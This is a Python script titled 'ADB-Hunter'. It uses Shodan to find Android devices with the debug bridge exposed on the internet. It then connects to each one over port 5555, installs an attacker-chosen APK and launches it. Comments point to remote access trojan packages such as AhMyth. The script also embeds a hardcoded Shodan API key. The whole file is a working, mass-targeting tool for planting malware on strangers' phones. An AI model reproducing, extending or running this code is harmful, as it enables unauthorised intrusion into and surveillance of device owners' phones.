#!/usr/local/bin/python3
# coding: utf-8

# Information
logo = (r"""

   █████╗ ██████╗ ██████╗       ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗      ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████║██║  ██║██████╔╝█████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══██║██║  ██║██╔══██╗╚════╝██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██║  ██║██████╔╝██████╔╝      ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝╚═════╝ ╚═════╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
  * Find and Exploit android devices                               Created by LimerBoy



""")

# If this shodan api key stops working just remove it from here and insert your key.
api_key = 'PSKINdQe1GyxGgecYz2191H2JoS9qvgD'

# Modules
try:
	import os
	import socket
	import time
	import shodan #pip3 install shodan
	import datetime #pip3 install datetime
except ImportError as error:
	module = str(error).split()[-1].replace('\'', '')
	print(
	'\nModule ' + module + ' is not installed!',
	'\npip3 install -r requirements.txt'
	)
	raise SystemExit

# Create logs folder
if not os.path.exists('logs'):
	os.mkdir('logs')

# Main
def main():
	os.system('clear')
	print(logo)

	# Android devices scanner
	def scanner():
		api  = shodan.Shodan(api_key) 
		date = datetime.datetime.today().strftime("%H.%M.%S-%d-%m")
		pages_start  = int(input('[?] Start scanning from page : '))
		pages_stop   = int(input('[?] Stop  scanning on   page : '))
		results_file = r'logs/ips-' + date + '.txt'
		# Load and save results from pages
		print('[?] If you press Ctrl + C scanning will be stopped!')
		for page in range(pages_start, pages_stop, 1):
			try:
				print('[' + str(page) + '/' + str(pages_stop) + '] Loading page results... ')
				time.sleep(1)
				results = api.search('android debug bridge product:\"Android Debug Bridge\"', page = page)
			except KeyboardInterrupt:
				print('\n[!] (Ctrl + C) detected.. Stopping...')
				break
			except shodan.exception.APIError as error:
				print('[EXCEPTION] ' + str(error))
				time.sleep(3)
				continue
			else:
				for result in results['matches']:
					with open(results_file, 'a') as file:
						file.write(result['ip_str'] + '\n')
		# Display results after loading
		if os.path.exists(results_file):
			print('\n[+] Okay, all results from page ' + str(pages_start) + ' to page ' + str(pages_stop) +  ', was saved to ' + results_file)
			if input('[?] Show downloaded results? (y/n) : ').lower() in ('y', 'yes', 'true', '1', '+'):
				with open(results_file, 'r') as file:
					lines = file.readlines()
					for line in lines:
						print(line.replace('\n', ''))
				print('[+] Saved ' + str(len(lines)) + ' ips')


	# Install .apk to systems
	def install():
		os.system('adb tcpip 5555; adb disconnect')
		
		#ips = 'logs/ips-21.33.30-25-11.txt'
		#file = 'rat.apk'
		#name = 'ahmyth.mine.king.ahmyth'

		# Check if ips list exists
		ips  = input('[?] Enter ip\'s file location\n===> ')
		if not os.path.exists(ips):
			print('[!] File with ip\'s ' + ips + ' not found!')
			exit()
		# Check if apk exists
		file = input('[?] Enter .apk file locaton\n===> ')
		if not os.path.exists(file):
			print('[!] File ' + file + ' not found!')
			exit()
		# Check if file is .apk
		if not file.endswith('.apk'):
			print('[!] Only android package (.apk) can be selected!')
			exit()

		name = input('[?] Enter a package name.\n    They look like this --> ahmyth.mine.king.ahmyth\n===> ')
		
		# read
		with open(ips, 'r') as f:
			ips = f.readlines()

		# Check if port is open
		def portIsOpen(ip, port, timeout = 0.5):
			try:
				sock = socket.socket()
				sock.settimeout(timeout)
				sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				result = sock.connect_ex((ip, int(port)))
				sock.close()
			except:  
				return False
			else:
				if result == 0:
					return True
				else:
					return False

		
		for ip in ips:
			try:
				ip = ip.replace('\n', '') + ':5555'

				# Check if port is open
				if portIsOpen(ip.split(':')[0], '5555'):
					# Try connect
					connection = os.popen('adb connect ' + ip).read()
					if connection.startswith('connected') or connection.startswith('already'):
						print('\n[+] Connected to ' + ip + '. Trying to install file')
						installation = os.popen('adb -s ' + ip + ' install ' + file).read()
						if installation.startswith('Performing'):
							print('[+] File installed. Trying to execute')
							execute = os.popen('adb -s ' + ip + ' shell monkey -p ' + name + ' -v 500').readlines()
							if not execute[0].startswith('error'):
								for line in execute:
									print(line.replace('\n', ''))
								print('[+] File executed.')
							else:
								print('[-] Failed execute file..')
				else:
					print('[-] ' + ip + ' is offline...')
			except KeyboardInterrupt:
				print('\n[!] (Ctrl + C) detected.. Stopping...')
				exit()


	# Menu
	print('''
 [1] Scanner
 [2] Installer
 [3] Exit
		  ''')

	menu_option = int(input('[OPTION] ==> '))
	if   menu_option == 1:
		scanner()
	elif menu_option == 2:
		install()
	else:
		exit()


if __name__ == '__main__':
	main()
	print('[$] Created by LimerBoy with Love.')
